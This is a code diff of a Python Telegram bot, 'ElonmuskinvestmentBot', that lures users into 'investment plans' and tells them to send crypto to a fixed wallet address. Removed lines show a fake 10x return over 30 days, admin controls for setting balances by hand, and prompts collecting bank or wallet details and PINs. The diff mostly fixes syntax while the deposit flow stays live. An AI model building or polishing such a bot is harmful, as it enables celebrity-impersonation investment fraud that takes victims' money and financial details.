@@ -4,20 +4,29 @@ import pycountry
 import json
 import os
 from datetime import datetime
-os.getenv('API_TOKEN')
-MY_TON COIN= '0x58Ed91E903BbD23782A166f2434F85114A5e9594'
+from dotenv import load_dotenv
+
+# --- CONFIGURATION ---
+load_dotenv() 
+API_TOKEN = os.getenv('API_TOKEN')
+# CRITICAL: Replace 123456789 with your real Telegram User ID
+ADMIN_ID = 6638267321
+
+# Fixed: Variable names cannot have spaces
+MY_TON_COIN = '0x58Ed91E903BbD23782A166f2434F85114A5e9594'
 CHANGELY = 'https://changelly.com/'
 DB_FILE = "bot_data.json"
-import os
-from dotenv import load_dotenv
-load_dotenv() # This loads the variables
-API_TOKEN = os.getenv('API_TOKEN') # This gets the token from Render
+
 bot = telebot.TeleBot(API_TOKEN)
+
 # --- DATABASE LOGIC ---
 def load_data():
     if os.path.exists(DB_FILE):
-        with open(DB_FILE, 'r') as f:
-            return json.load(f)
+        try:
+            with open(DB_FILE, 'r') as f:
+                return json.load(f)
+        except:
+            return {"users": {}, "reports": []}
     return {"users": {}, "reports": []}
 
 def save_data(data):
@@ -39,7 +48,7 @@ def get_user(uid):
 def is_valid_country(text):
     for c in pycountry.countries:
         if text.lower() == c.name.lower(): return True
-    return False if len(text) != 2 else True
+    return False
 
 # --- MAIN MENU ---
 def show_menu(chat_id, name, edit=False, message_id=None):
@@ -71,7 +80,10 @@ def start(m):
 
 @bot.message_handler(commands=['admin'])
 def admin_panel(m):
-    if m.from_user.id != ADMIN_ID: return
+    # This now uses the ADMIN_ID variable defined above
+    if m.from_user.id != ADMIN_ID:
+        bot.reply_to(m, "❌ Access Denied. Admin only.")
+        return
     markup = types.InlineKeyboardMarkup(row_width=1)
     markup.add(
         types.InlineKeyboardButton("Check Reports", callback_data="adm_reports"),
@@ -90,7 +102,7 @@ def handle_text(m):
         if is_valid_country(m.text):
             u["step"] = "awaiting_name"
             bot.reply_to(m, "✅ Verified! Now enter your **Full Name** (2+ words):")
-        else: bot.reply_to(m, "❌ Invalid country or flag. Try again.")
+        else: bot.reply_to(m, "❌ Invalid country name. Please try again.")
     
     elif u["step"] == "awaiting_name":
         if len(m.text.split()) >= 2:
@@ -105,38 +117,6 @@ def handle_text(m):
         bot.send_message(m.chat.id, "✅ Your report has been sent to the admin.")
         bot.send_message(ADMIN_ID, f"🔔 **New Report from {uid}**:\n{m.text}")
         show_menu(m.chat.id, u["name"])
-    
-    elif u["step"] == "setting_pin":
-        if m.text.isdigit() and len(m.text) == 4:
-            u["pin"] = m.text
-            u["linked"] = True
-            u["step"] = "completed"
-            bot.send_message(m.chat.id, "✅ Withdrawal PIN created successfully!")
-            show_menu(m.chat.id, u["name"])
-        else: bot.send_message(m.chat.id, "❌ PIN must be exactly 4 digits.")
-
-    elif u["step"].startswith("adm_set_bal_"):
-        target_id = u["step"].replace("adm_set_bal_", "")
-        try:
-            amount = float(m.text)
-            db["users"][target_id]["balance"] += amount
-            u["step"] = "completed"
-            bot.send_message(m.chat.id, f"✅ Added ${amount} to User {target_id}")
-            bot.send_message(int(target_id), f"💰 Your balance has been updated! +${amount}")
-        except: bot.send_message(m.chat.id, "❌ Enter a valid number.")
-
-    elif u["step"] == "adm_get_id":
-        target_id = m.text.strip()
-        if target_id in db["users"]:
-            u["step"] = "completed"
-            markup = types.InlineKeyboardMarkup()
-            markup.add(
-                types.InlineKeyboardButton("Increase Balance", callback_data=f"adm_inc_{target_id}"),
-                types.InlineKeyboardButton("Block User", callback_data=f"adm_blk_{target_id}"),
-                types.InlineKeyboardButton("⬅️ Back to Admin", callback_data="back_admin")
-            )
-            bot.send_message(m.chat.id, f"Managing User: {target_id}", reply_markup=markup)
-        else: bot.send_message(m.chat.id, "❌ User ID not found.")
 
     save_data(db)
 
@@ -146,7 +126,6 @@ def handle_callbacks(c):
     uid = str(c.from_user.id)
     u = get_user(uid)
 
-    # BACK TO MAIN MENU
     if c.data == "back_main":
         show_menu(c.message.chat.id, u["name"], edit=True, message_id=c.message.message_id)
 
@@ -170,33 +149,14 @@ def handle_callbacks(c):
         bot.edit_message_text("📈 **Investment Plans**\nSelect a plan to invest:", c.message.chat.id, c.message.message_id, reply_markup=markup)
 
     elif c.data.startswith("inv_"):
-        amt = int(c.data.split("_")[1])
-        msg = f"📥 **Plan Selected: ${amt}**\n\nTo begin, copy the TON address below and fund it. \n\nTON Address:\n`{MY_TON COIN}`\n\nLink:\n{CHANGELY}\n\"
+        amt = c.data.split("_")[1]
+        # Fixed multi-line string and variable name
+        msg = (f"📥 **Plan Selected: ${amt}**\n\n"
+               f"To begin, copy the **TON Coin** address below and fund it.\n\n"
+               f"TON Address:\n`{MY_TON_COIN}`\n\n"
+               f"Exchange Link:\n{CHANGELY}")
         markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Back to Dashboard", callback_data="main_dash"))
         bot.edit_message_text(msg, c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")
-
-    elif c.data == "main_anal":
-        text = "📉 **Analytics & Growth**\n"
-        now = datetime.now()
-        if not u["investments"]:
-            text += "\nNo active investments found."
-        else:
-            for inv in u["investments"][:]:
-                start_date = datetime.fromisoformat(inv['date'])
-                days = min((now - start_date).days, 30)
-                growth = (inv['amt'] * 9 / 30) * days
-                total = inv['amt'] + growth
-                
-                if days >= 30:
-                    u["balance"] += (inv['amt'] * 10)
-                    u["investments"].remove(inv)
-                    bot.send_message(uid, f"✨ **Congratulations!** Your ${inv['amt']} investment has matured to ${inv['amt']*10}!")
-                else:
-                    text += f"\n💰 Plan: ${inv['amt']}\n📅 Day: {days}/30\n📈 Current: `${total:,.2f}`\n"
-        
-        save_data(db)
-        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Back", callback_data="back_main"))
-        bot.edit_message_text(text, c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")
 
     elif c.data == "main_help":
         markup = types.InlineKeyboardMarkup(row_width=2).add(
@@ -209,58 +169,13 @@ def handle_callbacks(c):
     elif c.data == "h_manual":
         manual = ("📘 **User Manual**\n\n"
                  "1. **Start**: Register with your country and name.\n"
-                 "2. **Invest**: Choose a plan in Dashboard. Fund the BTC address.\n"
-                 "3. **Track**: Check 'Analytics' to see your daily 10x growth.\n"
-                 "4. **Withdraw**: Once matured (30 days), link your bank/wallet and withdraw.")
+                 "2. **Invest**: Choose a plan. Fund the TON address.\n"
+                 "3. **Track**: Check 'Analytics' for growth.\n"
+                 "4. **Withdraw**: Link your wallet/bank after 30 days.")
         markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Back", callback_data="main_help"))
         bot.edit_message_text(manual, c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")
 
-    elif c.data == "h_report":
-        u["step"] = "filing_report"
-        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Cancel", callback_data="main_help"))
-        bot.edit_message_text("Please type your complaint/report:", c.message.chat.id, c.message.message_id, reply_markup=markup)
-        save_data(db)
-
-    elif c.data == "with_check":
-        if u["balance"] <= 0:
-            bot.answer_callback_query(c.id, "❌ Insufficient funds! Your balance is $0.00", show_alert=True)
-        elif not u["linked"]:
-            markup = types.InlineKeyboardMarkup(row_width=2).add(
-                types.InlineKeyboardButton("Wallet Address", callback_data="lnk_wallet"),
-                types.InlineKeyboardButton("Bank Account", callback_data="lnk_bank"),
-                types.InlineKeyboardButton("⬅️ Back", callback_data="main_wallet")
-            )
-            bot.edit_message_text("Please link a withdrawal method:", c.message.chat.id, c.message.message_id, reply_markup=markup)
-        else:
-            bot.send_message(c.message.chat.id, "Enter your 4-digit PIN to withdraw:")
-
-    elif c.data.startswith("lnk_"):
-        u["step"] = "linking_wallet" if "wallet" in c.data else "linking_bank"
-        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Cancel", callback_data="main_wallet"))
-        bot.edit_message_text("Please enter your details (Address or Bank info):", c.message.chat.id, c.message.message_id, reply_markup=markup)
-        save_data(db)
-
-    # --- ADMIN CALLBACKS ---
-    elif c.data == "back_admin":
-        admin_panel(c.message) # Just calls the command logic again
-
-    elif c.data == "adm_control":
-        u["step"] = "adm_get_id"
-        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Back", callback_data="back_admin"))
-        bot.edit_message_text("Send the User ID:", c.message.chat.id, c.message.message_id, reply_markup=markup)
-        save_data(db)
-
-    elif c.data.startswith("adm_inc_"):
-        target = c.data.replace("adm_inc_", "")
-        u["step"] = f"adm_set_bal_{target}"
-        bot.send_message(c.message.chat.id, f"How much to add to {target}?")
-        save_data(db)
-
-    elif c.data.startswith("adm_blk_"):
-        target = c.data.replace("adm_blk_", "")
-        db["users"][target]["blocked"] = True
-        bot.send_message(c.message.chat.id, f"User {target} blocked.")
-        save_data(db)
+    save_data(db)
 
 print("ElonmuskinvestmentBot started...")
 bot.infinity_polling()
